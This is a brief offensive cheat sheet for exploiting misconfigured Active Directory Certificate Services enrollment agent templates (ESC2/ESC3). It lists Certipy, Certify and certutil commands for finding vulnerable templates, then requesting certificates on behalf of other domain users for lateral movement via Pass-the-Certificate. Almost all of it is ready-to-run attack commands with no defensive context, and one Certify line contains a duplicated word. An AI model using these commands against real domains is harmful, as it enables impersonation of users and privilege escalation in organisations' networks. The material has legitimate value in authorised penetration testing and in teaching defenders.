# ESC2/ESC3 - Misconfigured Enrollment Agent Templates (Use an enrollment agent to request a certificate

## Enumeration

 - certutil -v -dsTemplate

 - certify.exe find [/vulnerable]

 - certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DOMAIN_CONTROLLER

## Exploitation

#### 1) Linux

 - certipy req -u USER@DOMAIN -p PASSWORD -target CA_SERVER -template 'VULNERABLE_TEMPLATE_NAME' -ca CA_NAME

 - certipy req -u USER@DOMAIN -p PASSWORD -target CA_SERVER -template 'VULNERABLE_TEMPLATE_NAME' -ca CA_NAME -on-behalf-of 'DOMAIN\USER' -pfx CERTIFICATE

#### 2) Windows

 - certify.exe request /ca:SERVER\CA_NAME /template:"VULNERABLE_TEMPLATE_NAME"

 - certify.exe request request /ca:SERVER\CA_NAME /template:TEMPLATE /onbehalfof:DOMAIN\USER /enrollmcert:CERT.pfx [/enrollcertpw:CERT_PASSWORD]

## This technique is used to move laterally via Pass-the-Certificate
